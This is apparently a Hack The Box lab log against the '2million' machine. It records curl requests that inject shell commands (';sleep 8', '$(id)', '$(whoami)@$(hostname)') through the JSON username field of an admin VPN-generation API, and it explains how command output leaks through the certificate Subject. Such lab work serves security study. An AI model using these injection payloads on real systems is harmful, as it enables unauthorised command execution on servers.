Input:
```sh
IP=10.129.229.66  # hktr428 session (now is_admin=1), Host: 2million.htb
curl -X POST -H "$H" -H "Content-Type: application/json" -d '{"username":"<PAYLOAD>"}' \
     -b tmp/cookies.txt http://$IP/api/v1/admin/vpn/generate
```

Output:
```
{"username":"hktr428"}        -> 200, full .ovpn (cert for hktr428)
{"username":"ghostuser123"}   -> 200, full .ovpn (cert for arbitrary name! -subj string)
{"username":"hktr428;id"}     -> 200, empty body
{"username":"hktr428;sleep 8"}-> 200, empty body, time=8.47s   <- BLIND CMD INJECTION
{"username":"$(id)"}          -> 200 empty
{"username":"$(whoami)@$(hostname)"} -> Subject: ... O=www-data@2million, CN=www-data@2million
```

VULN: POST /api/v1/admin/vpn/generate passes JSON `username` into shell command (openssl cert gen).
`;` chains blind command exec; `$()` substitution puts command OUTPUT into cert Subject (O=/CN=)
=> output-exfil channel. Running as www-data on host "2million".
